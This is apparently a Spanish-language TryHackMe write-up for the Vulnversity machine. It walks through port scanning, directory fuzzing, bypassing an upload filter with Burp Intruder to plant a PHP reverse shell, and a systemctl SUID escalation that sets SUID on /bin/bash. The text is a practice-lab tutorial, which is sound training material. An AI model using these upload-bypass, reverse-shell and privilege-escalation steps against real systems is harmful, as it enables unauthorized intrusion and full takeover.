I"9W<p>El día de hoy vamos a resolver la máquina <em>Vulnversity</em> de <em>TryHackMe</em>. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos así como identificar la versión y servicios que corren en el activo. Es importante aclarar que así como menciona la plataforma de <em>TryHackMe</em>, existen diversos <a href="https://www.stationx.net/nmap-cheat-sheet/">cheatsheets</a> que podemos encontrar en internet, cuyo principal objetivo es darnos a conocer cuales son todas las posiblidades que nos ofrece la herramienta.</p>

<p>No obstante, recordemos que varias herramientas por defecto tienen incluidas un <code class="language-plaintext highlighter-rouge">manual</code> o vienen con un comando <code class="language-plaintext highlighter-rouge">--help</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man nmap
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --help
</code></pre></div></div>

<p>Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:</p>

<ul>
  <li>¿Cuántos puertos abiertos existen?</li>
  <li>¿Qué sistema operativo tiene la máquina ante la que nos estamos enfrentando?</li>
  <li>¿En qué puerto está corriendo el servidor web?</li>
  <li>¿Qué versión de squid proxy está corriendo en la máquina?</li>
</ul>

<p>Todas estas preguntas son fáciles de responder si realizamos un buen escaneo con <em>Nmap</em>.</p>

<p>Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --open -T5 -v -n &lt;dirección IP&gt;
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt;
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<ul>
  <li>p - Escanea todo el rango de puertos (65535 en total)</li>
  <li>open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</li>
  <li>T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido  “, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></li>
  <li>v - <em>Verbose</em>, reporta lo encontrado por consola</li>
  <li>n - No aplicar <em>resolución DNS</em></li>
  <li>sS - Escaneo <em>TCP SYN</em></li>
  <li>min-rate - Emitir paquetes no más lentos que «valor» por segundo</li>
  <li>vvv - Triple <em>verbose</em>, para obtener mayor información por consola</li>
  <li>Pn - No aplicar <em>host discovery</em></li>
</ul>

<p>Para determinar la versión y servicios que corren bajo estos puertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p 21,22,139,445,3128,3333 &lt;dirección IP&gt;
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<ul>
  <li>sC - Scripts básicos de enumeración</li>
  <li>sV - Versión y servicios que corren bajo los puertos encontrados</li>
  <li>p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</li>
</ul>

<p>Con estos dos escaneos bastará para responder a las preguntas planteadas con anterioridad, sin embargo nos quedan dos preguntas más, las cuales son:</p>

<ul>
  <li>¿Cuántos puertos se escanearán si utilizamos el parámetro -p-400?</li>
  <li>Utilizando el parámetro -n, ¿qué no se está resolviendo?</li>
</ul>

<p>Para responder a estas dos preguntas bastará con haber leído el <code class="language-plaintext highlighter-rouge">manual</code> de <em>Nmap</em>, haber utilizado su parámetro <code class="language-plaintext highlighter-rouge">--help</code>, o bien, haber prestado atención a los parámetros utilizados durante el escaneo. En este caso, si colocamos un número después de <code class="language-plaintext highlighter-rouge">-p-</code>, se escaneará tantos puertos hayamos indicado; y en el caso del parámetro <code class="language-plaintext highlighter-rouge">-n</code>, no se aplicará <em>resolución DNS</em>.</p>

<p>Una vez hemos determinado que puertos están abiertos, así como identificado la versión y servicios que corren en el activo, otro paso importante dentro de la fase de reconocimiento, es el <code class="language-plaintext highlighter-rouge">fuzzing</code>; cabe aclarar que este solo se realiza cuando la máquina víctima está corriendo un servidor web.</p>

<p><em>TryHackMe</em> nos recomienda utilizar <code class="language-plaintext highlighter-rouge">GoBuster</code>, sin embargo, personalmente prefiero el uso de <code class="language-plaintext highlighter-rouge">Wfuzz</code>; en caso de no contar con esta herramienta instalada, bastará con realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install wfuzz
</code></pre></div></div>

<p>Para pasar a la fase de explotación, lo que nos solicita la plataforma es encontrar una ruta potencial de la página web, que nos permita una subida de archivos, para lo cual debemos de <em>fuzzear</em> la página web, para ello realizaremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -L -t 400 --hc 404 --hh 33014 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://dirección IP:3333/FUZZ 2&gt; /dev/null
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el <em>fuzzeo</em> del servidor web:</p>

<ul>
  <li>c - Output colorizado</li>
  <li>L - Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero</li>
  <li>t - Específicamos el número de hilos con el queremos trabajar</li>
  <li>hc - Oculta las respuestas con el código de estado que indiquemos, en este caso los errores (código de estado 404)</li>
  <li>hh - Oculta las respuestas con el número de caractéres que indiquemos; esto no es necesario, sin embargo, es útil para descartar respuestas con contenido que vemos que no nos interesan</li>
  <li>w - Especificamos el diccionario con el que queremos trabajar</li>
</ul>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/2.png" alt="" /></p>

<p>En caso de no utilizar el parámetro <code class="language-plaintext highlighter-rouge">-hh</code>, vemos que obtenemos una mayor cantidad de respuestas, sin embargo no son relevantes, por este motivo es que se las escondió.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/3.png" alt="" /></p>

<p>Como podemos observar, existen cinco direcciones a las cuales podemos acceder, sin embargo, solamente una de ellas llama nuestra atención, la dirección <code class="language-plaintext highlighter-rouge">internal</code>, ya que en <em>images</em>, <em>css</em>, <em>js</em> y <em>fonts</em> parece ser donde está alojado el contenido de la página web. Y en efecto, al entrar en la dirección <code class="language-plaintext highlighter-rouge">internal</code>, podemos observar que tenemos un panel que nos permite realizar una subida de archivos, con la cual nos entablaremos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/4.png" alt="" /></p>

<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>

<p>Al encontrarnos una ruta potencial que nos permite una subida de archivos, lo primero que vamos a intentar es entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>; podemos descargar una <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">aquí</a>. Una vez la hayamos descargado, tenemos que modificar el valor de la <code class="language-plaintext highlighter-rouge">ip</code> (colocamos la nuestra), y si queremos, podemos también modificar el valor del <em>puerto</em>, aunque esto es completamente opcional.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/5.png" alt="" /></p>

<p>Sin embargo, cuando intentamos subir nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>, nos aparecerá un mensaje indicándonos que la extensión de nuestro archivo no es permitida.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/6.png" alt="" /></p>

<p>Por lo que tendremos que buscar una extensión que no nos de problema alguno. Si realizaramos este proceso de forma manual, sería algo bastante tedioso, por lo que vamos a utilizar <code class="language-plaintext highlighter-rouge">Burp Suite</code> para poder realizar una ataque de tipo <code class="language-plaintext highlighter-rouge">Sniper</code>.</p>

<p>Para ello, vamos a empezar por volver a subir nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>, pero ahora tramitando todas las peticiones a través de <code class="language-plaintext highlighter-rouge">Burp Suite</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/7.png" alt="" /></p>

<p>Posterior a ello presionaremos <code class="language-plaintext highlighter-rouge">Ctrl + I</code> para enviar esta petición al <code class="language-plaintext highlighter-rouge">Intruder</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/8.png" alt="" /></p>

<p>Ahora, en el apartado <em>Positions</em>, en el tipo de ataque elegiremos la opción de <code class="language-plaintext highlighter-rouge">Sniper</code>, después seleccionaremos la opción <code class="language-plaintext highlighter-rouge">Clear §</code>, para posteriormente con nuestro cursor <code class="language-plaintext highlighter-rouge">resaltar</code> la zona en la que se encuentra la extensión del archivo que subimos, para finalmente presionar la opción <code class="language-plaintext highlighter-rouge">Add §</code>; esto se vería algo así:</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/9.png" alt="" /></p>

<p>Posteriormente, procederemos a crear un pequeño diccionario con las extensiones más comunes de <em>PHP</em>:</p>

<ul>
  <li>.php</li>
  <li>.phtml</li>
  <li>.php3</li>
  <li>.php4</li>
  <li>.php5</li>
  <li>.php7</li>
  <li>.phps</li>
  <li>.php-s</li>
  <li>.pht</li>
  <li>.phar</li>
</ul>

<p>Una vez, hemos creado nuestro diccionario, en el apartado <em>Payloads</em>, en la opción <em>Sample List</em> cargaremos el diccionario que hemos creado; en este mismo apartado, en el final, encontraremos una opción que codifica ciertos caracteres especiales, esta opción la desactivaremos.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/10.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/11.png" alt="" /></p>

<p>Finalmente, presionaremos el botón de iniciar ataque, e inmediatamente aparecerá una nueva ventana mostrándonos los resultados obtenidos, o bien, aquello que todavía está probando. Podríamos revisar una a una las respuestas del lado del servidor, pero si nos percatamos, aunque todas las respuestas tengan el mismo código de estado <code class="language-plaintext highlighter-rouge">200</code>, la <em>longitud</em> de estas no es la misma para para todas las extensiones, la única extensión cuya <em>longitud</em> varía es <code class="language-plaintext highlighter-rouge">.phtml</code>; si quisieramos estar completamente seguros, podríamos revisar el <em>render</em> de la respuesta, el cual nos devuelve un <em>success</em>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/12.png" alt="" /></p>

<p>Con esta información, ya sabemos que tipo de archivo es válido para subir en la ruta <code class="language-plaintext highlighter-rouge">internal</code>, por lo que procederemos a cambiar la extensión de nuestro archivo y subirlo una última vez.</p>

<p>Una vez el archivo está subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code> a través de <code class="language-plaintext highlighter-rouge">Netcat</code>. A partir de aquí podemos hacer dos cosas:</p>

<p>Podemos navegar a la dirección en la que está subido nuestro archivo (tal como lo indica la plataforma de <em>TryHackMe</em>), es decir, entrar a:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
</code></pre></div></div>
<p>O por otra parte, y sin dejar la consola, utilizar el comando <code class="language-plaintext highlighter-rouge">curl</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
</code></pre></div></div>

<p>Ambas opciones, nos conseguirán una <em>consola</em> dentro de la máquina víctima.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/13.png" alt="" /></p>

<p>Es importante aclarar que la <em>consola</em> que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisieramos limpiar la <em>consola</em> utilizando <code class="language-plaintext highlighter-rouge">Ctrl + L</code>, no pasará nada, así mismo si quisieramos desplazarnos utilizando las <code class="language-plaintext highlighter-rouge">flechas</code> del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la <code class="language-plaintext highlighter-rouge">TTY</code>, para lo cual haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null -c bash

Ctrl + Z

stty raw -echo; fg
reset
xterm

export TERM=xterm
export SHELL=bash

stty rows &lt;valor&gt; columns &lt;valor&gt;
</code></pre></div></div>

<p>Los valores que colocaremos en <code class="language-plaintext highlighter-rouge">&lt;valor&gt;</code> en el último comando, dependerán del tamaño de nuestra pantalla, por lo cual en una nueva terminal de nuestra máquina escribiremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty -a
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/14.png" alt="" /></p>

<p>Continuando con las preguntas de la plataforma, se nos pide averigurar por el usuario que maneja el servidor web, así como su respectiva flag. Para realizar esto podríamos dirigirnos al directorio <code class="language-plaintext highlighter-rouge">/home</code>, y listar los directorios que existen.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/15.png" alt="" /></p>

<p>Aunque también podriamos filtrar del archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, a través de expresiones regulares, todos aquellos usuario que tengan una <em>shell</em>, sea esta una:</p>

<ul>
  <li>bash</li>
  <li>csh</li>
  <li>ksh</li>
  <li>sh</li>
  <li>tcsh</li>
  <li>zsh</li>
</ul>

<p>Esto sería bastante fácil, ya que todas, o casi todas las <em>shells</em> terminan en <code class="language-plaintext highlighter-rouge">sh</code>, de modo que con ambas formas podemos determinar que usuarios existen a nivel de sistema.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/passwd | grep "sh$"
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/16.png" alt="" /></p>

<p>Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la flag del usuario con bajos privilegios, para ello podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find . -name user.txt 2&gt; /dev/null
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/17.png" alt="" /></p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p>Para realizar esta última fase, la misma plataforma de <em>TryHackMe</em> nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos <code class="language-plaintext highlighter-rouge">SUID</code>.</p>

<p>Para listar todos aquellos binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code> asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/18.png" alt="" /></p>

<p>La mejor forma para abusar de algún binario, es recurrir a <a href="https://gtfobins.github.io/">GTFOBins</a>, esta página nos enseña como explotar binarios con <em>capabilities</em> mal asignadas, binarios que se pueden ejectuar como <em>root</em>, y en este caso, binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code> mal asignados.</p>

<p>El binario más extraño que nos encontramos es <code class="language-plaintext highlighter-rouge">/bin/systemctl</code>, ya que este comando lo que nos permite es controlar el sistema y sus servicios, por lo que procederemos a buscarlo en <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/19.png" alt="" /></p>

<p>Como podemos ver, podemos abusar de este binario fácilmente, además de que nos permite ejecutar cualquier código malicioso que queramos</p>

<p>Para conseguir la última flag haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' &gt; $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
</code></pre></div></div>

<p>Si nos percatamos, lo único que modificamos de la información que nos provee <code class="language-plaintext highlighter-rouge">GTFOBins</code>, fue el código a ejecutar, en este caso, estamos asignando un permiso <code class="language-plaintext highlighter-rouge">SUID</code> a la <code class="language-plaintext highlighter-rouge">/bin/bash</code>, para posteriormente, a través del parámetro <code class="language-plaintext highlighter-rouge">-p</code>, ejecutar el binario <code class="language-plaintext highlighter-rouge">/bin/bash</code> manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario <em>root</em>. Otro aspecto que se modificó, fue utilizar el binario <code class="language-plaintext highlighter-rouge">/bin/systemctl</code> desde su ruta absoluta, mas no de su ruta relativa.</p>

<p>Una vez hemos abusado del binario <code class="language-plaintext highlighter-rouge">/bin/systemctl</code>, haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash -p
</code></pre></div></div>

<p>Una vez siendo <em>root</em>, podemos pasar a buscar su respectiva flag, esto lo podemos hacer así:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find . -name root.txt
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity-TryHackMe/20.png" alt="" /></p>
:ET